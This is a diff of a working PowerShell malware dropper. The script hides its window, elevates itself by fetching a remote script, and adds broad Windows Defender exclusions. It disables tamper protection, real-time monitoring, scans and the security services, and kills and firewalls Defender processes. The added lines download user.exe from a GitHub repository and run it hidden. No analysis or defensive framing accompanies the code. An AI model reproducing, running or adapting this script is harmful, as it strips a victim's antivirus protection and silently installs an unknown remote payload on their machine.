@@ -5,10 +5,9 @@ try {
     if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
 } catch {}
 
-# ===== ADMIN CHECK =====
+# ===== ADMIN CHECK + ELEVATION =====
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-# ===== ELEVATION LOOP =====
 if (-not $isAdmin) {
     $tmp = Join-Path $env:TEMP "_svc.ps1"
     (iwr "https://github.com/analysisw/test/raw/refs/heads/main/teest.ps1" -UseBasicParsing).Content | Out-File $tmp -Encoding UTF8 -Force
@@ -19,7 +18,13 @@ if (-not $isAdmin) {
     }
 }
 
-#Requires -RunAsAdministrator
+# ===== EXCLUSIONS (BEFORE STOPPING SERVICES) =====
+Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionExtension "exe" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionExtension "dll" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionExtension "ps1" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath "C:\Users" -ErrorAction SilentlyContinue
 
 # ===== TAMPER PROTECTION =====
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -Force
@@ -57,7 +62,6 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
 
 # ===== POLICIES — SPYNET / CLOUD =====
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Force | Out-Null
@@ -78,13 +82,6 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Repor
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" -Force | Out-Null
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" -Name "DisableQuickScan" -Value 1 -Type DWord -Force
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Scan" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force
-
-# ===== EXCLUSIONS (temp folder) =====
-Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionExtension "exe" -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionExtension "dll" -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionExtension "ps1" -ErrorAction SilentlyContinue
 
 # ===== BLOCK MpCmdRun.exe =====
 $mpCmdRun = "$env:ProgramFiles\Windows Defender\MpCmdRun.exe"
@@ -119,8 +116,6 @@ New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Cent
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray" -Name "DisableSystray" -Value 1 -Type DWord -Force
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Force | Out-Null
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Type DWord -Force
-
-# ===== DISABLE WINDOWS SECURITY APP =====
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center" -Name "DisableNotificationCenter" -Value 1 -Type DWord -Force
 
 # ===== TASK KILL =====
@@ -131,7 +126,7 @@ taskkill /F /IM MpCmdRun.exe
 New-NetFirewallRule -DisplayName "Block MsMpEng" -Direction Outbound -Program "$env:ProgramFiles\Windows Defender\MsMpEng.exe" -Action Block -ErrorAction SilentlyContinue
 New-NetFirewallRule -DisplayName "Block MpCmdRun" -Direction Outbound -Program "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -Action Block -ErrorAction SilentlyContinue
 
-# ===== ADDITIONAL REGISTRY — DISABLE DEFENDER UI =====
+# ===== DISABLE DEFENDER UI =====
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "SecurityHealth" -Value ([byte[]](03,00,00,00,00,00,00,00,00,00,00,00)) -Type Binary -Force
 
 # ===== SERVICES — REGISTRY START TYPE =====
@@ -141,8 +136,18 @@ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisDrv" -Name 
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdNisSvc" -Name "Start" -Value 4 -Type DWord -Force
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Value 4 -Type DWord -Force
 
-# ===== ADMIN: WORK =====
+# ===== DOWNLOAD + EXECUTE user.exe =====
 $folder = $env:TEMP
-try { Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue } catch {}
-try { Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/user.exe" -OutFile "$folder\user.exe" -ErrorAction SilentlyContinue } catch {}
-try { Start-Process -FilePath "$folder\user.exe" } catch {}
+$url = "https://github.com/analysisw/test/raw/refs/heads/main/user.exe"
+$outFile = "$folder\user.exe"
+
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $url -OutFile $outFile -UseBasicParsing -ErrorAction Stop
+    if (Test-Path $outFile) {
+        $size = (Get-Item $outFile).Length
+        if ($size -gt 1024) {
+            Start-Process -FilePath $outFile -WindowStyle Hidden
+        }
+    }
+} catch {}
